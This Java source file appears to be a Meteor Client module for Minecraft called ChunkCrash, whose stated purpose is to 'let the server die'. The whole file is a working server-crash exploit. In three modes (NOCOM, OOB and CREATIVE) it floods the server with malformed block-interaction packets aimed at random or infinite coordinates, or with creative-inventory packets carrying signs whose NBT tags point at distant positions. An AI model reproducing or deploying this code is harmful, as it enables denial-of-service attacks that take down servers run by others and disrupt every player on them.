package meteordevelopment.meteorclient.systems.modules.crash;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import meteordevelopment.meteorclient.systems.modules.Categories;

import java.util.Random;

public class ChunkCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("how to crash")
        .defaultValue(Modes.NOCOM)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("packets per tick")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    public ChunkCrash() {
        super(Categories.Crash, "chunk-crash", "let the server die");
    }

    private final Random r = new Random();
    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case NOCOM -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d cpos = pickRandomPos();
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false), 0));
                }
            }
            case OOB -> {
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(Double.POSITIVE_INFINITY, 255, Integer.MAX_VALUE), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 255, Integer.MIN_VALUE), false), 0));
                info("Server should shit itself if it's old enough, toggling");
                toggle();
            }
            case CREATIVE -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d cpos = pickRandomPos();
                    ItemStack owo = new ItemStack(Items.OAK_SIGN, 1);
                    NbtCompound tag = owo.getOrCreateSubNbt("BlockEntityTag");
                    tag.putInt("x", (int) cpos.x);
                    tag.putInt("y", (int) cpos.y);
                    tag.putInt("z", (int) cpos.z);
                    mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, owo));
                }
            }
        }
    }

    public enum Modes {
        OOB, NOCOM, CREATIVE
    }
}
